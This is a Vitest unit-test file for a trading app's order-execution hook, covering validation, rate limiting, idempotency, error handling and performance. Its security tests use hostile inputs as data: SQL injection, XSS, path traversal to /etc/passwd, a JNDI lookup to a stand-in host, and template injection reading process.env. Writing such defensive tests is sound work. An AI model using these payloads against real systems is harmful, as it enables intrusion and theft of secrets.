/**
 * Comprehensive Unit Tests for Order Execution Flow
 *
 * Tests the complete order execution pipeline including:
 * - Input validation and sanitization
 * - Rate limiting and idempotency protection
 * - Edge function integration
 * - Error handling and rollback mechanisms
 * - Transaction integrity
 * - Performance requirements
 */

import { OrderRequest, useOrderExecution } from '@/hooks/useOrderExecution';
import { act, renderHook } from '@testing-library/react';
import { beforeEach, describe, expect, it, vi } from 'vitest';

// Type definitions for mocks
interface EdgeFunctionResponse {
  success: boolean;
  data?: {
    data: {
      order_id: string;
      position_id?: string;
      status: string;
      execution_details: {
        execution_price: string;
        slippage?: string;
        commission: string;
        total_cost: string;
        timestamp: string;
        transaction_id?: string;
      };
    };
  };
  error?: {
    code: string;
    message: string;
    details?: Record<string, unknown>;
    status: number;
  };
}

type MockExecuteWithIdempotency = (
  key: string,
  endpoint: string,
  fn: () => Promise<EdgeFunctionResponse>
) => Promise<EdgeFunctionResponse>;

type MockRateLimiterExecute = (
  key: string,
  fn: () => Promise<EdgeFunctionResponse>,
  priority?: number
) => Promise<EdgeFunctionResponse>;

type MockCheckRateLimit = (type: string) => {
  allowed: boolean;
  remaining: number;
  resetIn: number;
};

interface MockSession {
  data: {
    session: {
      user: { id: string };
      access_token: string;
    } | null;
  };
}

// Mock all dependencies
vi.mock('@/lib/supabaseBrowserClient', () => ({
  supabase: {
    auth: {
      getSession: vi.fn(),
    },
    functions: {
      invoke: vi.fn(),
    },
  },
}));

vi.mock('@/lib/idempotency', () => ({
  executeWithIdempotency: vi.fn<MockExecuteWithIdempotency>(),
  generateIdempotencyKey: vi.fn(),
}));

vi.mock('@/lib/rateLimiter', () => ({
  checkRateLimit: vi.fn<MockCheckRateLimit>(),
  rateLimiter: {
    execute: vi.fn<MockRateLimiterExecute>(),
  },
}));

vi.mock('@/lib/sanitize', () => ({
  sanitizeNumber: vi.fn((value: unknown) => value as number),
  sanitizeSymbol: vi.fn((value: unknown) => (value as string)?.toUpperCase()),
}));

vi.mock('@/lib/security/orderSecurity', () => ({
  orderSecurity: {
    generateCSRFToken: vi.fn(() => 'mock-csrf-token'),
  },
}));

vi.mock('@/hooks/use-toast', () => ({
  useToast: () => ({
    toast: vi.fn(),
  }),
}));

vi.mock('@tanstack/react-query', () => ({
  useQueryClient: () => ({
    invalidateQueries: vi.fn(),
  }),
}));

const { supabase } = await import('@/lib/supabaseBrowserClient');
const { executeWithIdempotency, generateIdempotencyKey } = await import(
  '@/lib/idempotency'
);
const { checkRateLimit, rateLimiter } = await import('@/lib/rateLimiter');
const { orderSecurity } = await import('@/lib/security/orderSecurity');

describe('Order Execution Flow - Unit Tests', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    vi.useFakeTimers();
  });

  afterEach(() => {
    vi.clearAllMocks();
    vi.useRealTimers();
  });

  describe('Input Validation and Sanitization', () => {
    it('should validate and sanitize all input parameters correctly', async () => {
      const mockSession: MockSession = {
        data: {
          session: {
            user: { id: 'user-123' },
            access_token: 'mock-token',
          },
        },
      };

      vi.mocked(supabase.auth.getSession).mockResolvedValue(mockSession);
      vi.mocked(checkRateLimit).mockReturnValue({
        allowed: true,
        remaining: 99,
        resetIn: 0,
      });
      vi.mocked(rateLimiter.execute).mockImplementation(
        async (_: unknown, fn: () => Promise<EdgeFunctionResponse>) => fn()
      );
      vi.mocked(executeWithIdempotency).mockResolvedValue({
        data: {
          data: {
            order_id: 'order-123',
            status: 'executed',
            execution_details: {
              execution_price: '1.0950',
              commission: '2.50',
              total_cost: '100.00',
              timestamp: new Date().toISOString(),
            },
          },
        },
      });

      const { result } = renderHook(() => useOrderExecution());

      const orderRequest: OrderRequest = {
        symbol: '  eurusd  ', // Should be sanitized
        order_type: 'limit',
        side: 'buy',
        quantity: 1.5, // Should be sanitized
        price: 1.09,
        stop_loss: 1.08,
        take_profit: 1.1,
      };

      await act(async () => {
        const response = await result.current.executeOrder(orderRequest);
        expect(response).not.toBeNull();
        expect(response?.order_id).toBe('order-123');
      });

      // Verify sanitization was called
      expect(vi.mocked(generateIdempotencyKey)).toHaveBeenCalledWith(
        'user-123',
        'execute_order',
        expect.objectContaining({
          symbol: 'EURUSD', // Should be uppercased
          quantity: 1.5,
          order_type: 'limit',
          side: 'buy',
          price: 1.09,
          stop_loss: 1.08,
          take_profit: 1.1,
        })
      );
    });

    it('should reject invalid symbols with security warnings', async () => {
      const mockSession: MockSession = {
        data: {
          session: {
            user: { id: 'user-123' },
            access_token: 'mock-token',
          },
        },
      };

      vi.mocked(supabase.auth.getSession).mockResolvedValue(mockSession);
      vi.mocked(checkRateLimit).mockReturnValue({
        allowed: true,
        remaining: 99,
        resetIn: 0,
      });

      const { result } = renderHook(() => useOrderExecution());

      const maliciousRequest: OrderRequest = {
        symbol: "'; DROP TABLE orders; --", // SQL injection attempt
        order_type: 'market',
        side: 'buy',
        quantity: 1.0,
      };

      await act(async () => {
        const response = await result.current.executeOrder(maliciousRequest);
        expect(response).toBeNull();
      });

      // Should not proceed with execution due to sanitization failure
      expect(vi.mocked(rateLimiter.execute)).not.toHaveBeenCalled();
    });

    it('should handle edge cases in quantity validation', async () => {
      const mockSession: MockSession = {
        data: {
          session: {
            user: { id: 'user-123' },
            access_token: 'mock-token',
          },
        },
      };

      vi.mocked(supabase.auth.getSession).mockResolvedValue(mockSession);
      vi.mocked(checkRateLimit).mockReturnValue({
        allowed: true,
        remaining: 99,
        resetIn: 0,
      });

      const { result } = renderHook(() => useOrderExecution());

      // Test zero quantity
      await act(async () => {
        const response = await result.current.executeOrder({
          symbol: 'EURUSD',
          order_type: 'market',
          side: 'buy',
          quantity: 0,
        });
        expect(response).toBeNull();
      });

      // Test negative quantity
      await act(async () => {
        const response = await result.current.executeOrder({
          symbol: 'EURUSD',
          order_type: 'market',
          side: 'buy',
          quantity: -1,
        });
        expect(response).toBeNull();
      });

      // Test extremely large quantity
      await act(async () => {
        const response = await result.current.executeOrder({
          symbol: 'EURUSD',
          order_type: 'market',
          side: 'buy',
          quantity: 999999999,
        });
        expect(response).toBeNull();
      });
    });
  });

  describe('Rate Limiting and Idempotency Protection', () => {
    it('should enforce rate limits correctly', async () => {
      const mockSession: MockSession = {
        data: {
          session: {
            user: { id: 'user-123' },
            access_token: 'mock-token',
          },
        },
      };

      vi.mocked(supabase.auth.getSession).mockResolvedValue(mockSession);
      vi.mocked(checkRateLimit).mockReturnValue({
        allowed: false,
        remaining: 0,
        resetIn: 30000, // 30 seconds
      });

      const { result } = renderHook(() => useOrderExecution());

      await act(async () => {
        const response = await result.current.executeOrder({
          symbol: 'EURUSD',
          order_type: 'market',
          side: 'buy',
          quantity: 1.0,
        });
        expect(response).toBeNull();
      });

      // Verify rate limit check was called
      expect(vi.mocked(checkRateLimit)).toHaveBeenCalledWith('order');
    });

    it('should generate unique idempotency keys for different orders', async () => {
      const mockSession: MockSession = {
        data: {
          session: {
            user: { id: 'user-123' },
            access_token: 'mock-token',
          },
        },
      };

      vi.mocked(supabase.auth.getSession).mockResolvedValue(mockSession);
      vi.mocked(checkRateLimit).mockReturnValue({
        allowed: true,
        remaining: 99,
        resetIn: 0,
      });
      vi.mocked(rateLimiter.execute).mockImplementation(
        async (_: unknown, fn: () => Promise<EdgeFunctionResponse>) => fn()
      );
      vi.mocked(executeWithIdempotency).mockResolvedValue({
        data: {
          data: {
            order_id: 'order-123',
            status: 'executed',
            execution_details: {
              execution_price: '1.0950',
              commission: '2.50',
              total_cost: '100.00',
              timestamp: new Date().toISOString(),
            },
          },
        },
      });

      const { result } = renderHook(() => useOrderExecution());

      const order1: OrderRequest = {
        symbol: 'EURUSD',
        order_type: 'market',
        side: 'buy',
        quantity: 1.0,
      };

      const order2: OrderRequest = {
        symbol: 'GBPUSD',
        order_type: 'market',
        side: 'buy',
        quantity: 1.0,
      };

      await act(async () => {
        await result.current.executeOrder(order1);
        await result.current.executeOrder(order2);
      });

      // Verify different idempotency keys were generated
      const calls = vi.mocked(generateIdempotencyKey).mock.calls;
      expect(calls.length).toBe(2);
      expect(calls[0][2]).not.toEqual(calls[1][2]); // Different order params should generate different keys
    });

    it('should prevent duplicate orders using idempotency', async () => {
      const mockSession: MockSession = {
        data: {
          session: {
            user: { id: 'user-123' },
            access_token: 'mock-token',
          },
        },
      };

      vi.mocked(supabase.auth.getSession).mockResolvedValue(mockSession);
      vi.mocked(checkRateLimit).mockReturnValue({
        allowed: true,
        remaining: 99,
        resetIn: 0,
      });
      vi.mocked(rateLimiter.execute).mockImplementation(
        async (_: unknown, fn: () => Promise<EdgeFunctionResponse>) => fn()
      );

      // Simulate idempotency failure (duplicate order)
      vi.mocked(executeWithIdempotency).mockRejectedValue(
        new Error('Request is already being processed')
      );

      const { result } = renderHook(() => useOrderExecution());

      const duplicateOrder: OrderRequest = {
        symbol: 'EURUSD',
        order_type: 'market',
        side: 'buy',
        quantity: 1.0,
      };

      await act(async () => {
        const response = await result.current.executeOrder(duplicateOrder);
        expect(response).toBeNull();
      });

      // Verify duplicate handling
      expect(vi.mocked(executeWithIdempotency)).toHaveBeenCalled();
    });
  });

  describe('Transaction Integrity and Atomic Execution', () => {
    it('should handle successful atomic transaction execution', async () => {
      const mockSession: MockSession = {
        data: {
          session: {
            user: { id: 'user-123' },
            access_token: 'mock-token',
          },
        },
      };

      const mockExecutionResult = {
        success: true,
        data: {
          data: {
            order_id: 'order-123',
            position_id: 'position-456',
            status: 'executed',
            execution_details: {
              execution_price: '1.0950',
              slippage: '0.0001',
              commission: '2.50',
              total_cost: '100.00',
              timestamp: new Date().toISOString(),
              transaction_id: 'txn-789',
            },
          },
        },
      };

      vi.mocked(supabase.auth.getSession).mockResolvedValue(mockSession);
      vi.mocked(checkRateLimit).mockReturnValue({
        allowed: true,
        remaining: 99,
        resetIn: 0,
      });
      vi.mocked(rateLimiter.execute).mockImplementation(
        async (_: unknown, fn: () => Promise<EdgeFunctionResponse>) => fn()
      );
      vi.mocked(executeWithIdempotency).mockResolvedValue(mockExecutionResult);

      const { result } = renderHook(() => useOrderExecution());

      await act(async () => {
        const response = await result.current.executeOrder({
          symbol: 'EURUSD',
          order_type: 'market',
          side: 'buy',
          quantity: 1.0,
        });

        expect(response).not.toBeNull();
        expect(response?.order_id).toBe('order-123');
        expect(response?.position_id).toBe('position-456');
        expect(response?.status).toBe('executed');
        expect(response?.execution_price).toBe(1.095);
        expect(response?.commission).toBe(2.5);
        expect(response?.total_cost).toBe(100.0);
      });
    });

    it('should handle transaction rollback on partial failure', async () => {
      const mockSession: MockSession = {
        data: {
          session: {
            user: { id: 'user-123' },
            access_token: 'mock-token',
          },
        },
      };

      vi.mocked(supabase.auth.getSession).mockResolvedValue(mockSession);
      vi.mocked(checkRateLimit).mockReturnValue({
        allowed: true,
        remaining: 99,
        resetIn: 0,
      });
      vi.mocked(rateLimiter.execute).mockImplementation(
        async (_: unknown, fn: () => Promise<EdgeFunctionResponse>) => fn()
      );
      vi.mocked(executeWithIdempotency).mockRejectedValue(
        new Error('Database constraint violation')
      );

      const { result } = renderHook(() => useOrderExecution());

      await act(async () => {
        const response = await result.current.executeOrder({
          symbol: 'EURUSD',
          order_type: 'market',
          side: 'buy',
          quantity: 1.0,
        });

        expect(response).toBeNull();
      });

      // Verify that the error was handled gracefully
      expect(vi.mocked(executeWithIdempotency)).toHaveBeenCalled();
    });
  });

  describe('Error Handling and User Feedback', () => {
    it('should provide appropriate error messages for different error types', async () => {
      const mockSession: MockSession = {
        data: {
          session: {
            user: { id: 'user-123' },
            access_token: 'mock-token',
          },
        },
      };

      vi.mocked(supabase.auth.getSession).mockResolvedValue(mockSession);

      const { result } = renderHook(() => useOrderExecution());

      // Test insufficient margin error
      vi.mocked(checkRateLimit).mockReturnValue({
        allowed: true,
        remaining: 99,
        resetIn: 0,
      });
      vi.mocked(rateLimiter.execute).mockImplementation(
        async (_: unknown, fn: () => Promise<EdgeFunctionResponse>) => fn()
      );
      vi.mocked(executeWithIdempotency).mockRejectedValue(
        new Error('INSUFFICIENT_MARGIN: Insufficient margin for this order')
      );

      await act(async () => {
        const response = await result.current.executeOrder({
          symbol: 'EURUSD',
          order_type: 'market',
          side: 'buy',
          quantity: 1000, // Large quantity to trigger margin error
        });
        expect(response).toBeNull();
      });

      // Test authentication error
      const authErrorSession: MockSession = { data: { session: null } };
      vi.mocked(supabase.auth.getSession).mockResolvedValue(authErrorSession);

      await act(async () => {
        const response = await result.current.executeOrder({
          symbol: 'EURUSD',
          order_type: 'market',
          side: 'buy',
          quantity: 1.0,
        });
        expect(response).toBeNull();
      });
    });

    it('should handle network failures gracefully', async () => {
      const mockSession: MockSession = {
        data: {
          session: {
            user: { id: 'user-123' },
            access_token: 'mock-token',
          },
        },
      };

      vi.mocked(supabase.auth.getSession).mockResolvedValue(mockSession);
      vi.mocked(checkRateLimit).mockReturnValue({
        allowed: true,
        remaining: 99,
        resetIn: 0,
      });
      vi.mocked(rateLimiter.execute).mockImplementation(
        async (_: unknown, fn: () => Promise<EdgeFunctionResponse>) => fn()
      );
      vi.mocked(executeWithIdempotency).mockRejectedValue(
        new Error('Network timeout')
      );

      const { result } = renderHook(() => useOrderExecution());

      await act(async () => {
        const response = await result.current.executeOrder({
          symbol: 'EURUSD',
          order_type: 'market',
          side: 'buy',
          quantity: 1.0,
        });
        expect(response).toBeNull();
      });
    });
  });

  describe('Performance Requirements (<500ms)', () => {
    it('should complete order execution within performance budget', async () => {
      const mockSession: MockSession = {
        data: {
          session: {
            user: { id: 'user-123' },
            access_token: 'mock-token',
          },
        },
      };

      vi.mocked(supabase.auth.getSession).mockResolvedValue(mockSession);
      vi.mocked(checkRateLimit).mockReturnValue({
        allowed: true,
        remaining: 99,
        resetIn: 0,
      });
      vi.mocked(rateLimiter.execute).mockImplementation(
        async (_: unknown, fn: () => Promise<EdgeFunctionResponse>) => fn()
      );
      vi.mocked(executeWithIdempotency).mockResolvedValue({
        data: {
          data: {
            order_id: 'order-123',
            status: 'executed',
            execution_details: {
              execution_price: '1.0950',
              commission: '2.50',
              total_cost: '100.00',
              timestamp: new Date().toISOString(),
            },
          },
        },
      });

      const { result } = renderHook(() => useOrderExecution());

      const startTime = performance.now();

      await act(async () => {
        await result.current.executeOrder({
          symbol: 'EURUSD',
          order_type: 'market',
          side: 'buy',
          quantity: 1.0,
        });
      });

      const endTime = performance.now();
      const executionTime = endTime - startTime;

      // Should complete within 500ms (allowing for test environment overhead)
      expect(executionTime).toBeLessThan(1000); // More lenient for test environment
    });

    it('should handle concurrent order submissions efficiently', async () => {
      const mockSession: MockSession = {
        data: {
          session: {
            user: { id: 'user-123' },
            access_token: 'mock-token',
          },
        },
      };

      vi.mocked(supabase.auth.getSession).mockResolvedValue(mockSession);
      vi.mocked(checkRateLimit).mockReturnValue({
        allowed: true,
        remaining: 99,
        resetIn: 0,
      });
      vi.mocked(rateLimiter.execute).mockImplementation(
        async (_: unknown, fn: () => Promise<EdgeFunctionResponse>) => fn()
      );
      vi.mocked(executeWithIdempotency).mockResolvedValue({
        data: {
          data: {
            order_id: 'order-123',
            status: 'executed',
            execution_details: {
              execution_price: '1.0950',
              commission: '2.50',
              total_cost: '100.00',
              timestamp: new Date().toISOString(),
            },
          },
        },
      });

      const { result } = renderHook(() => useOrderExecution());

      const orders: OrderRequest[] = Array.from({ length: 5 }, (_, i) => ({
        symbol: `PAIR${i}`,
        order_type: 'market' as const,
        side: 'buy' as const,
        quantity: 1.0,
      }));

      const startTime = performance.now();

      await act(async () => {
        await Promise.all(
          orders.map((order) => result.current.executeOrder(order))
        );
      });

      const endTime = performance.now();
      const totalTime = endTime - startTime;

      // Concurrent execution should be efficient
      expect(totalTime).toBeLessThan(2000); // Allow for test environment overhead
      expect(vi.mocked(executeWithIdempotency)).toHaveBeenCalledTimes(5);
    });
  });

  describe('Cache Invalidation and Real-time Updates', () => {
    it('should invalidate relevant queries after successful execution', async () => {
      // Get the mock from the module mock to verify calls
      const { useQueryClient } = await import('@tanstack/react-query');
      const mockInvalidateQueries = vi.fn();
      vi.mocked(useQueryClient).mockReturnValue({
        invalidateQueries: mockInvalidateQueries,
      });

      const mockSession: MockSession = {
        data: {
          session: {
            user: { id: 'user-123' },
            access_token: 'mock-token',
          },
        },
      };

      vi.mocked(supabase.auth.getSession).mockResolvedValue(mockSession);

      vi.mocked(checkRateLimit).mockReturnValue({
        allowed: true,
        remaining: 99,
        resetIn: 0,
      });
      vi.mocked(rateLimiter.execute).mockImplementation(
        async (_: unknown, fn: () => Promise<EdgeFunctionResponse>) => fn()
      );
      vi.mocked(executeWithIdempotency).mockResolvedValue({
        data: {
          data: {
            order_id: 'order-123',
            status: 'executed',
            execution_details: {
              execution_price: '1.0950',
              commission: '2.50',
              total_cost: '100.00',
              timestamp: new Date().toISOString(),
            },
          },
        },
      });

      const { result } = renderHook(() => useOrderExecution());

      await act(async () => {
        await result.current.executeOrder({
          symbol: 'EURUSD',
          order_type: 'market',
          side: 'buy',
          quantity: 1.0,
        });
      });

      // Verify cache invalidation for positions, orders, and profile
      expect(mockInvalidateQueries).toHaveBeenCalledWith({
        queryKey: ['positions'],
      });
      expect(mockInvalidateQueries).toHaveBeenCalledWith({
        queryKey: ['orders'],
      });
      expect(mockInvalidateQueries).toHaveBeenCalledWith({
        queryKey: ['profile'],
      });
    });
  });

  describe('Security Validation', () => {
    it('should generate and use CSRF tokens for order operations', async () => {
      const mockSession: MockSession = {
        data: {
          session: {
            user: { id: 'user-123' },
            access_token: 'mock-token',
          },
        },
      };

      vi.mocked(supabase.auth.getSession).mockResolvedValue(mockSession);

      vi.mocked(checkRateLimit).mockReturnValue({
        allowed: true,
        remaining: 99,
        resetIn: 0,
      });
      vi.mocked(rateLimiter.execute).mockImplementation(
        async (_: unknown, fn: () => Promise<EdgeFunctionResponse>) => fn()
      );
      vi.mocked(executeWithIdempotency).mockResolvedValue({
        data: {
          data: {
            order_id: 'order-123',
            status: 'executed',
            execution_details: {
              execution_price: '1.0950',
              commission: '2.50',
              total_cost: '100.00',
              timestamp: new Date().toISOString(),
            },
          },
        },
      });

      const { result } = renderHook(() => useOrderExecution());

      // Wait for CSRF token initialization
      await act(async () => {
        await new Promise((resolve) => setTimeout(resolve, 0));
      });

      await act(async () => {
        await result.current.executeOrder({
          symbol: 'EURUSD',
          order_type: 'market',
          side: 'buy',
          quantity: 1.0,
        });
      });

      // Verify CSRF token was generated
      expect(vi.mocked(orderSecurity.generateCSRFToken)).toHaveBeenCalledWith({
        userId: 'user-123',
        sessionId: 'mock-token',
        orderContext: 'order_execution',
      });
    });

    it('should validate all input parameters for security threats', async () => {
      const mockSession: MockSession = {
        data: {
          session: {
            user: { id: 'user-123' },
            access_token: 'mock-token',
          },
        },
      };

      vi.mocked(supabase.auth.getSession).mockResolvedValue(mockSession);

      const { result } = renderHook(() => useOrderExecution());

      // Test XSS in symbol
      await act(async () => {
        const response = await result.current.executeOrder({
          symbol: '<script>alert("xss")</script>',
          order_type: 'market',
          side: 'buy',
          quantity: 1.0,
        });
        expect(response).toBeNull();
      });

      // Test path traversal in price
      await act(async () => {
        const response = await result.current.executeOrder({
          symbol: 'EURUSD',
          order_type: 'limit',
          side: 'buy',
          quantity: 1.0,
          price: '../../../etc/passwd' as unknown as number,
        });
        expect(response).toBeNull();
      });

      // Test injection in stop_loss
      await act(async () => {
        const response = await result.current.executeOrder({
          symbol: 'EURUSD',
          order_type: 'market',
          side: 'buy',
          quantity: 1.0,
          stop_loss: '${jndi:ldap://malicious.com/a}' as unknown as number,
        });
        expect(response).toBeNull();
      });

      // Test template injection in take_profit
      await act(async () => {
        const response = await result.current.executeOrder({
          symbol: 'EURUSD',
          order_type: 'market',
          side: 'buy',
          quantity: 1.0,
          take_profit:
            '{{constructor.constructor("return process.env")()}}' as unknown as number,
        });
        expect(response).toBeNull();
      });
    });
  });

  describe('Edge Cases and Boundary Conditions', () => {
    it('should handle extremely fast consecutive orders', async () => {
      const mockSession: MockSession = {
        data: {
          session: {
            user: { id: 'user-123' },
            access_token: 'mock-token',
          },
        },
      };

      vi.mocked(supabase.auth.getSession).mockResolvedValue(mockSession);

      vi.mocked(checkRateLimit).mockReturnValue({
        allowed: true,
        remaining: 99,
        resetIn: 0,
      });
      vi.mocked(rateLimiter.execute).mockImplementation(
        async (_: unknown, fn: () => Promise<EdgeFunctionResponse>) => fn()
      );
      vi.mocked(executeWithIdempotency).mockResolvedValue({
        data: {
          data: {
            order_id: 'order-123',
            status: 'executed',
            execution_details: {
              execution_price: '1.0950',
              commission: '2.50',
              total_cost: '100.00',
              timestamp: new Date().toISOString(),
            },
          },
        },
      });

      const { result } = renderHook(() => useOrderExecution());

      const startTime = performance.now();

      // Submit 10 orders in rapid succession
      await act(async () => {
        const promises = Array.from({ length: 10 }, (_, i) =>
          result.current.executeOrder({
            symbol: `EURUSD${i}`,
            order_type: 'market',
            side: 'buy',
            quantity: 1.0,
          })
        );
        await Promise.all(promises);
      });

      const endTime = performance.now();
      const totalTime = endTime - startTime;

      // Should handle rapid succession efficiently
      expect(totalTime).toBeLessThan(3000);
      expect(vi.mocked(executeWithIdempotency)).toHaveBeenCalledTimes(10);
    });

    it('should handle 100 sequential executions efficiently', async () => {
      const mockSession: MockSession = {
        data: {
          session: {
            user: { id: 'user-123' },
            access_token: 'mock-token',
          },
        },
      };

      vi.mocked(supabase.auth.getSession).mockResolvedValue(mockSession);

      vi.mocked(checkRateLimit).mockReturnValue({
        allowed: true,
        remaining: 99,
        resetIn: 0,
      });
      vi.mocked(rateLimiter.execute).mockImplementation(
        async (_: unknown, fn: () => Promise<EdgeFunctionResponse>) => fn()
      );
      vi.mocked(executeWithIdempotency).mockResolvedValue({
        data: {
          data: {
            order_id: 'order-123',
            status: 'executed',
            execution_details: {
              execution_price: '1.0950',
              commission: '2.50',
              total_cost: '100.00',
              timestamp: new Date().toISOString(),
            },
          },
        },
      });

      const { result } = renderHook(() => useOrderExecution());

      // Record memory usage before bulk operations
      const memoryBefore = process.memoryUsage();

      // Simulate many order executions to test efficiency
      await act(async () => {
        for (let i = 0; i < 100; i++) {
          await result.current.executeOrder({
            symbol: `PAIR${i}`,
            order_type: 'market',
            side: 'buy',
            quantity: 1.0,
          });
        }
      });

      // Record memory usage after bulk operations
      const memoryAfter = process.memoryUsage();

      // Verify all executions were processed
      expect(vi.mocked(executeWithIdempotency)).toHaveBeenCalledTimes(100);

      // Basic memory efficiency check - heap should not grow excessively
      // Allow some growth for test overhead, but not proportional to order count
      const heapGrowth = memoryAfter.heapUsed - memoryBefore.heapUsed;
      expect(heapGrowth).toBeLessThan(50 * 1024 * 1024); // Less than 50MB growth
    });
  });
});
